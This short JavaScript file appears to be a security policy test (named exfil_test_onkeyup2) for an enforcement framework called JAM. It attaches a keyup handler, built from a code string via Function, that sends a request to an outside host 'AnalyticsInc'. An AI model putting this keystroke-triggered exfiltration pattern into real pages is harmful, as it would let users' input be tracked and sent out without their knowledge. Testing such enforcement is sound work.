// exfil_test_onkeyup2.js
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onkeyup2", true);xmlhttp.send(null);';
var v0 = document.getElementById("test");
JAM.call(v0.addEventListener, v0, ["keyup", JAM.call(Function, null, [exp]), false], JAM.policy.p1)

